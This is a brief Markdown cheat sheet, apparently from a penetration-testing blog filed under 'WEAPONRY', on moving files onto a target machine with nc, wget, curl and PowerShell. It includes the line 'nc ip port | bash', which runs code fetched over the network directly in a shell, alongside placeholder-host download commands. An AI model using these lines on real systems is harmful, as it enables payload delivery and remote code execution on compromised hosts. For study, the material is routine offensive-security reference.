---
title: File Transfer
date: 2020-11-26 01:31:38
category: WEAPONRY
---

# File Transfer Cheat Sheet

## 0x01 通用


### NC
``` bash
# 本地
cat ${file}|nc -lnvp port
# 目标机
nc ip port >> ${file}
# 执行 bash 的话
nc ip port | bash
```

## 0x02 Linux

### Wget
``` bash
wget http://domain/file
```

### Curl
``` bash
curl http://domain/file -o file
```


## 0x03 Windows

### Wget
``` bash
wget -Uri http://domain/file -OutFile file
```

### Powershell
``` bash
powershell ...
```